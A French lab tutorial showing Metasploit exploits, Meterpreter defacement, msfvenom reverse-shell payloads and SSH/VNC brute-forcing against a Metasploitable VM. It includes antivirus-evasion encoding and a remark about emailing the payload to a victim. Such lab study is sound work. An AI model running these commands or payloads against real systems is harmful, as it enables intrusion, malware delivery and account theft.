# Exploiter des vulnérabilités avec Metasploit

## Configuration initiale

Ce guide présente comment mettre en place une infrastructure Kali Linux et Metasploitable sur le même réseau afin d'étudier l'exploitation de vulnérabilités.

**Configuration réseau :**
- Kali Linux : `172.16.0.30`
- Metasploitable : `172.16.0.102`

**Ressource :** [Télécharger Metasploitable](https://sourceforge.net/projects/metasploitable/)

## Démarrage du framework Metasploit

Ouvrez un terminal sur la Kali Linux et lancez le framework Metasploit : 

```bash
msfconsole
```

> **Remarque :** Metasploit peut mettre du temps à se lancer lors de la première exécution.

### Commandes de base

Pour afficher l'aide générale et découvrir les commandes disponibles :

```bash
msf6 > help
```

Pour rechercher des modules, exploits ou scripts en fonction d'un mot-clé :

```bash
msf6 > search mysql
```

Cette commande listera tous les modules associés au terme recherché (ici MySQL).

## Exploit 1 : Exploitation d'une backdoor (vsftpd)

### Étape 1 : Reconnaissance

Effectuez un scan Nmap sur la cible pour identifier les services disponibles :

```bash
nmap -sV 172.16.0.102
```

Le scan révèle que le service FTP sur le port 21 utilise **vsftpd 2.3.4**, une version connue pour contenir une backdoor.

### Étape 2 : Recherche de l'exploit

Recherchez dans Metasploit les exploits disponibles pour cette version :

```bash
msf6 > search vsftpd 2.3.4
```

Une backdoor de rang excellent, découverte en 2011, correspond à cette version.

### Étape 3 : Configuration et exécution

Chargez l'exploit (généralement au numéro 0) et visualisez les options requises :

```bash
msf6 > use 0
msf6 > options
```

Configurer le paramètre `RHOSTS` pour cibler la machine Metasploitable :

```bash
msf6 > set RHOSTS 172.16.0.102
```

Lancez l'exploit :

```bash
msf6 > exploit
```



## Exploit 2 : Exploitation d'un service Samba

Le scan précédent a probablement révélé l'exposition d'un service Samba sur les ports 139 et 445. Samba est l'équivalent open-source du système de partage de fichiers Windows.

### Étape 1 : Identification de la version Samba

Utilisez le module d'énumération SMB pour déterminer la version exacte :

```bash
msf6 > use auxiliary/scanner/smb/smb_version
msf6 > options
msf6 > set RHOSTS 172.16.0.102
msf6 > run
```

Cette commande vous retourne la version : **Samba 3.0.20-Debian**

### Étape 2 : Recherche d'exploits compatibles

Recherchez dans Metasploit les exploits disponibles pour cette version :

```bash
msf6 > search samba 3.0.20
```

### Étape 3 : Exploitation

Chargez et configurez l'exploit identifié :

```bash
msf6 > use exploit/multi/samba/usermap_script
msf6 > options
msf6 > set RHOSTS 172.16.0.102
msf6 > set LHOST 172.16.0.30
msf6 > run
```

Un shell minimalistique devrait s'ouvrir. Testez son fonctionnement avec des commandes comme `ls` ou `id`.

### Étape 4 : Gestion des sessions

Pour mettre la session en arrière-plan, pressez `Ctrl-Z` ou tapez `background` :

```bash
background
y (pour yes)
```

Affichez toutes les sessions actives :

```bash
msf6 > sessions -l
```

Reconnectez-vous à une session spécifique :

```bash
msf6 > sessions -i 1
```

## Exploit 3 : Service Web vulnérable (PHP + Meterpreter)

### Étape 1 : Détection de la version PHP

Utilisez `dirb` pour scanner le serveur web et identifier les fichiers disponibles :

```bash
dirb http://172.16.0.102
```

Accédez à la page `phpinfo.php` via votre navigateur pour connaître la version PHP utilisée :

> **Version trouvée :** PHP 5.2.4

Cette version est vulnérable à **PHPCGI Argument Injection**.

### Étape 2 : Recherche de l'exploit

Recherchez le module exploit correspondant :

```bash
msf6 > search php cgi rank:excellent cve:2012
```

### Étape 3 : Exploitation

Utilisez l'exploit `exploit/multi/http/php_cgi_arg_injection` :

```bash
msf6 > use exploit/multi/http/php_cgi_arg_injection
msf6 > set RHOSTS 172.16.0.102
msf6 > set LHOST 172.16.0.30
msf6 > run
```

### Étape 4 : Accès à Meterpreter

Après l'exploitation, vous obtenez une session Meterpreter. Il s'agit d'une charge utile avancée offrant un shell interactif exécuté en mémoire. Meterpreter fournit de nombreuses capacités post-exploitation :
- Téléchargement/Upload de fichiers
- Keylogger
- Capture d'écran
- Et bien d'autres...

Bien que principalement disponible pour Windows, Meterpreter existe aussi pour Linux et macOS.

Testez le shell avec les commandes suivantes :

```bash
meterpreter > help
meterpreter > sysinfo
meterpreter > getuid
meterpreter > shell
```

### Étape 5 : Défacement du site (Web Defacing)
Modifiez la page web d'accueil (index.php) en y inscrivant un message de propagande amusant (Ex: Vive les pingouins !).

```bash
meterpreter > edit index.php
```

Remplissez la page avec un message personnalisé :

```ini
vive les pingouins 
```

Vérifiez la modification en accédant à `http://172.16.0.102` dans votre navigateur.

## Exploit 4 : Cheval de Troie (msfvenom)

### Présentation de msfvenom

`msfvenom` est l'outil intégré à Metasploit permettant la génération personnalisée de payloads. Il combine les anciennes fonctionnalités de `msfpayload` et `msfencode`. Son principal intérêt réside dans la capacité à encoder des payloads pour contourner les antivirus.

Pour découvrir les options disponibles :

```bash
msfvenom -h
```

Pour lister tous les payloads disponibles :

```bash
msfvenom --list payloads
```

> **Astuce :** Utilisez `msfconsole` pour identifier les options requises d'un payload spécifique.

### Étape 1 : Génération du payload

Créez un payload Meterpreter pour Linux au format ELF :

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf LHOST=172.16.0.30 LPORT=4444 > runmeplz
```

Cette commande génère un binaire ELF nommé `runmeplz`. Notez sa taille.

### Étape 2 : Déploiement sur la cible

Transférez le payload sur la machine cible via SCP :

```bash
scp -o HostKeyAlgorithms=+ssh-rsa runmeplz msfadmin@172.16.0.102:/home/msfadmin
```

### Étape 3 : Mise en place du listener

Configurer un handler Metasploit pour écouter les connexions entrantes :

```bash
msf6 > use exploit/multi/handler
msf6 > set payload linux/x86/meterpreter/reverse_tcp
msf6 > set LPORT 4444
msf6 > set LHOST 172.16.0.30
msf6 > show info
msf6 > exploit -j -z
```

### Étape 4 : Amélioration - Contournement d'antivirus

Le payload généré peut être détecté par environ 40 antivirus. Pour l'encoder et augmenter sa furtivité :

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf -e x86/shikata_ga_nai LHOST=172.16.0.30 LPORT=4444 > runmeplz
```

> **Utilisation pratique :** Ce payload codé pourrait être envoyé par email en pièce jointe pour inciter la victime à l'exécuter sur sa machine.

## Exploit 5 : Énumération et Bruteforce (enum4linux + SSH)

### Présentation

`enum4linux` est un outil d'énumération SMB/Samba qui extrait des informations sensibles des protocoles de partage réseau Windows/Linux. Il exploite les failles de configuration courantes sur les anciens systèmes pour accéder à des données sans authentification.

### Étape 1 : Énumération des utilisateurs

Exécutez enum4linux pour récupérer la liste des utilisateurs du serveur Samba :

```bash
enum4linux -U 172.16.0.102
```

Cette commande devrait retourner une liste d'utilisateurs : `msfadmin`, `klog`, `sys`, `user`, `service`, etc.

### Étape 2 : Bruteforce SSH

Utilisez le module de scan SSH de Metasploit pour effectuer un bruteforce du mot de passe :
```bash
msf6 > use auxiliary/scanner/ssh/ssh_login
msf6 > set RHOSTS 172.16.0.102
msf6 > set USERNAME klog
msf6 > set PASS_FILE /usr/share/wordlists/rockyou.txt
```
si rockyou.txt est en .gz, cela signifie qu'il est zippé, pour le dézipper ouvrir une autre console et taper `sudo gunzip /usr/share/wordlists/rockyou.txt.gz`

```bash
msf6 > set THREADS 4
msf6 > set STOP_ON_SUCCESS true
msf6 > run
```

**Résultat :** Le mot de passe du compte `klog` est identifié et affiché. 

## Exploit 6 : Accès VNC (port 5900)

### Objectif

Découvrez les identifiants d'accès au service VNC fonctionnant sur la machine cible.

### Étape 1 : Bruteforce VNC

Utilisez le module d'authentification VNC de Metasploit :

```bash
msf6 > use auxiliary/scanner/vnc/vnc_login
msf6 > set RHOSTS 172.16.0.102
msf6 > set USERNAME root
msf6 > run
```

**Résultat attendu :** `Login successful : password`

### Étape 2 : Validation des identifiants

Vérifiez les credentials en vous connectant directement via VNC :

```bash
vncviewer 172.16.0.102
```

**Mot de passe :** `password`

Vous accédez ainsi à l'interface graphique de la machine cible.


